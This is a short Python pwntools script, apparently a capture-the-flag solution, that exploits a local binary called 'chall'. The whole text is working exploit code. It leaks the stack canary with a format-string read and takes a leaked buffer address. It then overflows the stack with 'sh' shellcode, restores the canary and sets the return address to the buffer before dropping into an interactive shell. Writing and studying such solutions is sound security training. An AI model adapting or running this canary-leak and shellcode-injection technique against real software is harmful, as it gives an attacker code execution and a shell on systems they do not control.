from pwn import * 

elf = context.binary = ELF('./chall')
p = elf.process()

code = b'0rd3r-66'
pl = code + b'%33$p'
p.sendline(pl)

p.recvuntil(code)
canary = int(p.recvline().strip(),16)
log.success(f'leaked canary: {hex(canary)}')

p.sendlineafter(b'[Y/N]',b'Y')
p.recvuntil(b'Target coordinates identified at: ')
target = int(p.recvline().strip(),16)
log.info(f'Taget buffer: {hex(target)}')

shellcode = asm(shellcraft.sh())
canary_offset = 88

payload = flat({
    0: shellcode,
    88: canary,
    104: target
}, filler=b'\x90')

p.sendafter(b'Please enter the instructions: ',payload)

p.interactive()
